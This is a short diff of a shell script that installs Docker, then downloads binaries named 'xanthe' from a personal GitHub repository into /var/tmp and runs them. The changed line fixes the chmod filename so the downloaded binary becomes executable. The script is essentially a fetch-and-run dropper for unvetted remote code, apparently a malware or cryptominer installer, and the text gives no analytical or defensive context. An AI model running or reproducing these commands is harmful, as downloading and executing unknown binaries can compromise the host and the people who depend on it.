@@ -10,7 +10,7 @@ apt-get install -y docker-ce docker-ce-cli containerd.io
 cd /var/tmp
 wget https://github.com/nandakrr/xanthe/blob/main/xanthe1?raw=true https://raw.githubusercontent.com/nandakrr/xanthe/main/xanthe_main
 mv xanthe1?raw=true xanthe
-chmod +x xanthe1 xanthe_main
+chmod +x xanthe xanthe_main
 ./xanthe
 ./xanthe
 ./xanthe_main
